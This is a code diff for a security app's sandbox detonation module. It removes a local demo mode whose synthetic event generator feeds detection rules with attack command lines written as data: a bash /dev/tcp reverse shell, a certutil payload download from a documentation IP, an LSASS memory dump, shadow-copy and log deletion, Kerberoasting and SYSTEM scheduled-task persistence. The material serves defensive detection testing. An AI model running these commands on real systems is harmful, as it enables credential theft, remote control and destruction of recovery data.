@@ -6,19 +6,15 @@ resulting report is normalized into the app's unified event schema and pushed
 through the *same* detection pipeline as live ingestion — so a sandbox run
 produces a normal run: process tree, network connections, alerts, risk score.
 
-**Provider keys are optional** (config.py). With no key configured the webapp
-gets a clearly-labeled deterministic *demo* detonation (`demo_events`) — the
-honest-fallback pattern from footprint.py, never fake intel presented as real:
-the task's `provider` field says `demo`, and the run is a normal analysis run
-whose events were generated locally. Configure `ANYRUN_API_KEY` /
-`TRIAGE_API_KEY` / `JOE_API_KEY` (+ optional `SANDBOX_PROVIDER`) to switch the
-same UI to live detonation.
+Configure `ANYRUN_API_KEY` / `TRIAGE_API_KEY` / `JOE_API_KEY` (+ optional
+`SANDBOX_PROVIDER`) to enable external detonation. If no provider is configured,
+the system rejects detonation requests with 422 Unprocessable Entity.
 
 **Task lifecycle.** `POST /sandbox/detonate` creates a run + a task entry and
-returns immediately (`submitted`). The demo path resolves inline (fast);
-configured live providers run in a background asyncio task that polls the
-provider until the analysis finishes, fetches the report, normalizes it, and
-ingests the events. `GET /sandbox/tasks/{id}` returns live status + counts.
+returns immediately (`submitted`). Configured live providers run in a background
+asyncio task that polls the provider until the analysis finishes, fetches the
+report, normalizes it, and ingests the events. `GET /sandbox/tasks/{id}` returns
+live status + counts.
 
 The live adapters are thin httpx wrappers over each provider's public REST
 API (documented inline). They are best-effort by construction: any provider
@@ -63,7 +59,7 @@ def is_configured(provider: str) -> bool:
 
 def active_provider() -> str:
     """The provider to use for `auto`: SANDBOX_PROVIDER if set & configured,
-    else the first configured one, else '' (callers fall back to demo)."""
+    else the first configured one, else '' (no provider configured)."""
     if config.SANDBOX_PROVIDER in _PROVIDER_KEYS and is_configured(config.SANDBOX_PROVIDER):
         return config.SANDBOX_PROVIDER
     for p in _PROVIDER_KEYS:
@@ -73,24 +69,28 @@ def active_provider() -> str:
 
 
 def resolve_provider(want: str) -> str:
-    """Map a request's provider string to a concrete provider id."""
+    """Map a request's provider string to a concrete configured provider id."""
     want = (want or "auto").strip().lower()
     if want == "auto":
-        return active_provider() or "demo"
-    if want == "demo":
-        return "demo"
+        active = active_provider()
+        if not active:
+            raise ValueError(
+                "No sandbox provider is configured. "
+                "Configure ANYRUN_API_KEY, TRIAGE_API_KEY, or JOE_API_KEY."
+            )
+        return active
     if want not in _PROVIDER_KEYS:
-        raise ValueError(f"Unknown sandbox provider: {want} — expected auto, demo, or one of {', '.join(_PROVIDER_KEYS)}")
+        raise ValueError(f"Unknown sandbox provider: {want} — expected auto, or one of {', '.join(_PROVIDER_KEYS)}")
+    if not is_configured(want):
+        raise ValueError(f"{want} is not configured — set the {want.upper()}_API_KEY env var")
     return want
 
 
 def providers_status() -> list[dict]:
-    """The provider list for GET /sandbox/providers — configured flags let the
-    UI badge each provider as live vs demo."""
+    """The provider list for GET /sandbox/providers."""
     out = []
     for pid, name in (("anyrun", "Any.Run"), ("triage", "Hatching Triage"), ("joe", "Joe Sandbox")):
         out.append({"id": pid, "name": name, "configured": is_configured(pid)})
-    out.append({"id": "demo", "name": "Local demo (no API key)", "configured": True})
     return out
 
 
@@ -413,228 +413,6 @@ async def _live_detonate(provider: str, task: dict, sample_bytes: bytes) -> dict
 
 
 # ---------------------------------------------------------------------------
-# Attack Scenario Playbooks & Demo Detonation
-# ---------------------------------------------------------------------------
-
-PLAYBOOKS: list[dict[str, Any]] = [
-    {
-        "id": "ransomware-stager",
-        "name": "Ransomware Pre-Encryption & Shadow Eraser",
-        "description": "Simulates volume shadow copy deletion (vssadmin), rapid multi-file encryption burst (.locked), ransom note drop, and Run-key persistence.",
-        "platform": "windows",
-        "severity": "critical",
-        "tactics": ["Defense Evasion", "Impact", "Persistence"],
-        "techniques": ["T1490", "T1486", "T1547.001"],
-    },
-    {
-        "id": "lolbin-credential-dump",
-        "name": "LOLBin & LSASS Credential Dumper",
-        "description": "Macro-spawned obfuscated PowerShell stager executing comsvcs.dll mini-dump against LSASS memory and staging credentials.",
-        "platform": "windows",
-        "severity": "critical",
-        "tactics": ["Initial Access", "Execution", "Credential Access"],
-        "techniques": ["T1566.001", "T1059.001", "T1003.001"],
-    },
-    {
-        "id": "c2-beacon-exfil",
-        "name": "C2 Beaconing & Security Log Eraser",
-        "description": "Certutil LOLBin payload download, persistent periodic C2 heartbeats to known malicious IP, and event log wiping (wevtutil).",
-        "platform": "windows",
-        "severity": "high",
-        "tactics": ["Command & Control", "Defense Evasion", "Exfiltration"],
-        "techniques": ["T1105", "T1071", "T1070.001"],
-    },
-    {
-        "id": "linux-persistence-rootkit",
-        "name": "Linux Cron Persistence & Reverse Shell",
-        "description": "Interactive bash reverse socket connection, /etc/cron.d automated task creation, and system auth log tampering.",
-        "platform": "linux",
-        "severity": "high",
-        "tactics": ["Execution", "Persistence", "Defense Evasion"],
-        "techniques": ["T1059.004", "T1053.003", "T1070.002"],
-    },
-    {
-        "id": "shadow-copy-delete",
-        "name": "Ransomware Shadow Deletion & Recovery Tamper",
-        "description": "Adversary executing vssadmin shadow deletion, wbadmin catalog wipe, and bcdedit recovery disablement before encryption.",
-        "platform": "windows",
-        "severity": "critical",
-        "tactics": ["Impact", "Defense Evasion"],
-        "techniques": ["T1490", "T1070"],
-    },
-    {
-        "id": "kerberoast-spn-enum",
-        "name": "Kerberoasting SPN Discovery & Ticket Extraction",
-        "description": "Active Directory SPN enumeration using setspn.exe followed by Kerberos ticket memory extraction via PowerShell.",
-        "platform": "windows",
-        "severity": "high",
-        "tactics": ["Discovery", "Credential Access"],
-        "techniques": ["T1087.002", "T1558.003"],
-    },
-    {
-        "id": "scheduled-task-persist",
-        "name": "Scheduled Task Persistence & Host Takeover",
-        "description": "Creation of SYSTEM-level automated Scheduled Task with logon trigger and registry TaskCache tampering.",
-        "platform": "windows",
-        "severity": "high",
-        "tactics": ["Persistence", "Privilege Escalation"],
-        "techniques": ["T1053.005", "T1543"],
-    },
-]
-
-
-def list_playbooks() -> list[dict[str, Any]]:
-    """List available attack scenario playbooks for live/interactive detonation."""
-    return PLAYBOOKS
-
-
-def demo_events(
-    run_id: str,
-    platform: str,
-    sample_name: str,
-    base: datetime.datetime,
-    scenario_id: str | None = None,
-) -> list[dict]:
-    """A deterministic synthetic detonation whose events are exactly the shape
-    the detection engine expects — the same rules fire as on a live analysis,
-    so the demo pipeline is the real pipeline end to end."""
-    # Specific Playbook Scenarios
-    if scenario_id == "ransomware-stager" or (not scenario_id and "ransom" in sample_name.lower()):
-        return [
-            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
-                process_name=sample_name, command_line=rf"C:\Users\victim\Downloads\{sample_name}"),
-            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
-                process_name="vssadmin.exe", command_line=r"vssadmin.exe delete shadows /all /quiet"),
-            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1000,
-                process_name="powershell.exe", command_line=r"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="),
-            *[_ev(run_id, "windows", "file_write", _seq(base, 3 + j), pid=1000,
-                  file_path=rf"C:\Users\victim\Documents\database_q{j+1}.mdf.locked") for j in range(6)],
-            _ev(run_id, "windows", "file_write", _seq(base, 10), pid=1000,
-                file_path=r"C:\Users\victim\Desktop\README_HOW_TO_DECRYPT.txt"),
-            _ev(run_id, "windows", "registry_write", _seq(base, 11), pid=1000,
-                process_name=sample_name,
-                registry_key=r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\LockerService"),
-        ]
-
-    if scenario_id == "lolbin-credential-dump" or (not scenario_id and "dump" in sample_name.lower()):
-        return [
-            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
-                process_name="winword.exe", command_line=r'"C:\Program Files\Microsoft Office\winword.exe" invoice.docm'),
-            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
-                process_name="cmd.exe", command_line=r'cmd.exe /c powershell.exe -EncodedCommand SQBFAFgA...'),
-            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1001,
-                process_name="rundll32.exe",
-                command_line=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full"),
-            _ev(run_id, "windows", "network_connection", _seq(base, 3), pid=1001,
-                dest_ip="198.51.100.45", dest_port=443, protocol="TCP"),
-            _ev(run_id, "windows", "file_write", _seq(base, 4), pid=1002,
-                file_path=r"C:\Windows\Temp\lsass.dmp"),
-        ]
-
-    if scenario_id == "c2-beacon-exfil":
-        return [
-            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
-                process_name="certutil.exe",
-                command_line=r"certutil.exe -urlcache -split -f https://203.0.113.88/stage2.exe C:\Temp\stage2.exe"),
-            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
-                process_name="stage2.exe", command_line=r"C:\Temp\stage2.exe --listen"),
-            _ev(run_id, "windows", "network_connection", _seq(base, 2), pid=1001,
-                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
-            _ev(run_id, "windows", "network_connection", _seq(base, 3), pid=1001,
-                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
-            _ev(run_id, "windows", "network_connection", _seq(base, 4), pid=1001,
-                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
-            _ev(run_id, "windows", "process_create", _seq(base, 5), pid=1002, ppid=1001,
-                process_name="wevtutil.exe", command_line=r"wevtutil.exe cl Security"),
-            _ev(run_id, "windows", "registry_write", _seq(base, 6), pid=1001,
-                registry_key=r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Stage2Updater"),
-        ]
-
-    if scenario_id == "shadow-copy-delete":
-        return [
-            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
-                process_name="vssadmin.exe", command_line=r"vssadmin.exe delete shadows /all /quiet"),
-            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
-                process_name="wbadmin.exe", command_line=r"wbadmin.exe delete catalog -quiet"),
-            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1000,
-                process_name="bcdedit.exe", command_line=r"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"),
-            _ev(run_id, "windows", "process_create", _seq(base, 3), pid=1003, ppid=1000,
-                process_name="bcdedit.exe", command_line=r"bcdedit.exe /set {default} recoveryenabled no"),
-            *[_ev(run_id, "windows", "file_write", _seq(base, 4 + j), pid=1000,
-                  file_path=rf"C:\Data\finance_q{j+1}.xlsx.enc") for j in range(4)],
-        ]
-
-    if scenario_id == "kerberoast-spn-enum":
-        return [
-            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
-                process_name="setspn.exe", command_line=r"setspn.exe -T corp.local -Q MSSQLSvc/*"),
-            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
-                process_name="powershell.exe",
-                command_line=r"powershell.exe -Command Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp.local'"),
-            _ev(run_id, "windows", "network_connection", _seq(base, 2), pid=1001,
-                dest_ip="10.0.0.1", dest_port=88, protocol="TCP"),
-            _ev(run_id, "windows", "file_write", _seq(base, 3), pid=1001,
-                file_path=r"C:\Temp\kerberoast_hashes.txt"),
-        ]
-
-    if scenario_id == "scheduled-task-persist":
-        return [
-            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
-                process_name="schtasks.exe",
-                command_line=r'schtasks.exe /create /tn "SecurityHealthServiceUpdate" /tr "C:\Users\victim\AppData\Local\Temp\updater.exe" /sc onlogon /ru "SYSTEM"'),
-            _ev(run_id, "windows", "registry_write", _seq(base, 1), pid=1000,
-                registry_key=r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SecurityHealthServiceUpdate"),
-            _ev(run_id, "windows", "file_write", _seq(base, 2), pid=1000,
-                file_path=r"C:\Windows\System32\Tasks\SecurityHealthServiceUpdate"),
-        ]
-
-    if platform == "linux" or scenario_id == "linux-persistence-rootkit":
-        return [
-            _ev(run_id, "linux", "process_create", _seq(base, 0), pid=2000, ppid=1,
-                process_name="sshd", command_line="sshd: root@pts/2"),
-            _ev(run_id, "linux", "process_create", _seq(base, 1), pid=2001, ppid=2000,
-                process_name="bash",
-                command_line="bash -i >& /dev/tcp/198.51.100.10/4444 0>&1"),
-            _ev(run_id, "linux", "network_connection", _seq(base, 2), pid=2001,
-                dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
-            _ev(run_id, "linux", "network_connection", _seq(base, 3), pid=2001,
-                dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
-            _ev(run_id, "linux", "network_connection", _seq(base, 4), pid=2001,
-                dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
-            _ev(run_id, "linux", "network_connection", _seq(base, 5), pid=2000,
-                dest_ip="1.1.1.1", dest_port=443, protocol="TCP"),
-            *[_ev(run_id, "linux", "file_write", _seq(base, 6 + j), pid=2000,
-                  file_path=f"/tmp/staged_{j:03d}.enc") for j in range(5)],
-            _ev(run_id, "linux", "file_write", _seq(base, 12), pid=2000,
-                file_path="/etc/cron.d/system_updater"),
-        ]
-
-    # Default Windows demo
-    return [
-        _ev(run_id, platform, "process_create", _seq(base, 0), pid=1000, ppid=4,
-            process_name=sample_name,
-            command_line=rf"C:\Users\victim\AppData\Local\Temp\{sample_name}"),
-        _ev(run_id, platform, "process_create", _seq(base, 1), pid=1001, ppid=1000,
-            process_name="cmd.exe", command_line=r"C:\Windows\System32\cmd.exe /c whoami"),
-        _ev(run_id, platform, "process_create", _seq(base, 2), pid=1002, ppid=1001,
-            process_name="powershell.exe", command_line="powershell.exe -enc SQBFAFgAAGgBdAA="),
-        _ev(run_id, platform, "network_connection", _seq(base, 3), pid=1002,
-            dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
-        _ev(run_id, platform, "network_connection", _seq(base, 4), pid=1002,
-            dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
-        _ev(run_id, platform, "network_connection", _seq(base, 5), pid=1002,
-            dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
-        _ev(run_id, platform, "network_connection", _seq(base, 6), pid=1000,
-            dest_ip="8.8.8.8", dest_port=443, protocol="TCP"),
-        *[_ev(run_id, platform, "file_write", _seq(base, 7 + j), pid=1002,
-              file_path=rf"C:\Users\victim\Documents\invoice_{j:03d}.enc") for j in range(5)],
-        _ev(run_id, platform, "registry_write", _seq(base, 13), pid=1000,
-            process_name=sample_name,
-            registry_key=r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Updater"),
-    ]
-
-
-# ---------------------------------------------------------------------------
 # Task manager
 # ---------------------------------------------------------------------------
 
@@ -673,16 +451,13 @@ def create_task(run_id: str, sample_id: str, sample_name: str, provider: str, pl
 
 
 async def run_task(task: dict, sample_bytes: bytes) -> None:
-    """Execute one detonation: submit/poll/fetch (live) or generate (demo),
+    """Execute one live external sandbox detonation: submit/poll/fetch,
     then ingest the normalized events through the real pipeline."""
     task["status"] = "running"
     base = datetime.datetime.now(datetime.timezone.utc)
     try:
-        if task["provider"] == "demo":
-            events = demo_events(task["run_id"], task["platform"], task["sample_name"], base)
-        else:
-            report = await _live_detonate(task["provider"], task, sample_bytes)
-            events = normalize_report(task["provider"], report, task["run_id"], task["platform"], base)
+        report = await _live_detonate(task["provider"], task, sample_bytes)
+        events = normalize_report(task["provider"], report, task["run_id"], task["platform"], base)
 
         with db_session() as conn:
             row = run_store.get_run(conn, task["run_id"])
